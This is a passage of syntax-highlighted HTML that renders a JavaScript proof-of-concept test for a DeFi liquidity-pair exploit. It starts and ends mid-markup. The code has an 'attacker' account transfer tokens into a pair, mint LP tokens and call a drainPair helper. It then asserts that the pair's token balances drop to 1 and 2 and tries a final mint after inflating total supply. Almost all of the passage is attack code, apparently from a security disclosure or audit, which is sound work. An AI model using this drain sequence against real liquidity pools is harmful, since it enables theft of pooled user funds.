class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`  Transferred \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e of \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e and \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e to pair.`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker mints LP tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emintTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emintReceipt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emintTx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Find the Mint event to get actual minted liquidity amount (optional, for detailed logging)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// const mintEvent = mintReceipt.events.find(e =\u0026gt; e.event === \u0026#39;Mint\u0026#39;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// const mintedLP = mintEvent.args.liquidity; // This might not be the direct LP amount, depends on Pair event\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`  Minted LP. Attacker LP Balance: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elpBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e, Pair TotalSupply: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Call drainPair without initial balances, it will fetch them\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edrainPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;  Called drainPair.\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenABalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenBBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`  Pair \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance after drain: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenABalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`  Pair \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance after drain: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenBBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoString\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Assertions based on PoC logs (DAI balance: 1, FRAX balance: 2)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Token A (e.g. DAI if token0) should be 1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Token B (e.g. FRAX if token1) should be 2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e === \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenABalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Cycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance in pair should be 1 after drain`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenBBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Cycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance in pair should be 2 after drain`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// tokenB is token0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenBBalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Cycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance in pair should be 1 after drain`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairTokenABalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Cycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e+\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e balance in pair should be 2 after drain`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk6\"\u003e\\n\u003c/span\u003e\u003cspan class=\"mtk8\"\u003eAttempting final mint which should fail...\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Last attempt to mint after inflating totalSupply\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 